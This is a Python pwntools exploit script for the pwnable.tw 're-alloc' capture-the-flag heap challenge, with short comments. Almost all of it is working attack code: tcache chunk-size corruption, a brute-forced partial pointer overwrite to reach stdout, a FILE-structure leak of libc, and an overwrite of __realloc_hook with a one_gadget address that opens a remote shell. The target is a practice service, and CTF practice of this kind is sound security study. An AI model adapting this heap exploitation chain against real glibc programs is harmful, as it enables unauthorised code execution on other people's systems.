import struct

from pwn import *


def alloc(sh, idx, size, data, sl=True):
    sh.sendlineafter('choice: ', b'1')
    sh.sendlineafter('Index:', str(idx))
    sh.sendlineafter('Size:', str(size))
    sh.sendafter('Data:', data)


def realloc(sh, idx, size, data):
    sh.sendlineafter('choice: ', b'2')
    sh.sendlineafter('Index:', str(idx))
    sh.sendlineafter('Size:', str(size))
    if (size > 0):
        sh.sendafter('Data:', data)


def free(sh, idx):
    sh.sendlineafter('choice: ', b'3')
    sh.sendlineafter('Index:', str(idx))


hh = 0
sh = 0
while (hh < 16):
    hh += 1
    print("TRY " + str(hh))
    try:
        # sh = process('./re-alloc')
        sh = remote('chall.pwnable.tw', 10310)
        alloc(sh, 0, 48, 'AAAA')
        free(sh, 0)

        # this is the size corruption primitive
        # By freeing and reallocating the size we can
        # overwrite size of the second freed chunk
        alloc(sh, 0, 80, 'BBBB')
        realloc(sh, 0, 0, '')
        realloc(sh, 0, 16, 'BBBB')
        free(sh, 0)

        # allcoating +0x400 bytes for our unsorted bin
        for ii in range(0, 9):
            alloc(sh, 0, 96, 'AAAA')
            realloc(sh, 0, 112, 'BBBB')
            free(sh, 0)

        # we need a 0x60 chunk to grab for final exploitation
        # just create it now
        alloc(sh, 0, 96, 'AAAA')
        free(sh, 0)

        # overwrite size to unsorted bin
        alloc(sh, 0, 80, p64(0) * 3 + p64(0x441))
        free(sh, 0)
        realloc(sh, 1, 0, '')
        # partial overwrite of fd pointer to stdout, bruteforce last 4 bits
        realloc(sh, 1, 112, p16(0x9760))

        alloc(sh, 0, 48, 'AAAA')
        free(sh, 0)
        realloc(sh, 1, 16, 'AAAA')
        free(sh, 1)

        # overwriting stdout to leak memory
        alloc(sh, 0, 48, p64(0xfbad1800) + p64(0) * 3)
        leak = sh.recv(0x40)
        print(leak)
        print(hex(u64(leak[32:40])))
        libc = u64(leak[32:40]) - 0x1e4780
        print("libc", hex(libc))

        # need another 0x40 chunk for final exploitation, create it here
        alloc(sh, 1, 112, 'pivot')
        realloc(sh, 1, 48, 'pivot')
        free(sh, 1)

        rhook = libc + 0x1e4c28
        rce = libc + 0x106ef8
        if (libc > 0x700000000000 and libc < 0x8f0000000000):
            print("found")
            break
        else:
            sh.close()

    except:
        sh.close()

print(hex(libc))
print(hex(rhook))

pause()
##now overwrite realloc_hook
# the heap is so broken at this point
# allocations that don't pull from occupied tcache bins will break!
alloc(sh, 1, 96, 'AAAA')
realloc(sh, 1, 0, '')
realloc(sh, 1, 32, 'BBBB')
free(sh, 1)

alloc(sh, 1, 96, p64(0) * 5 + p64(0x41) + p64(rhook) + p64(0))
free(sh, 1)

alloc(sh, 1, 48, 'AAAA')
realloc(sh, 1, 16, 'BBBB')
free(sh, 1)

print("shell...")
alloc(sh, 1, 48, p64(rce))
realloc(sh, 1, 0, '')

sh.interactive()
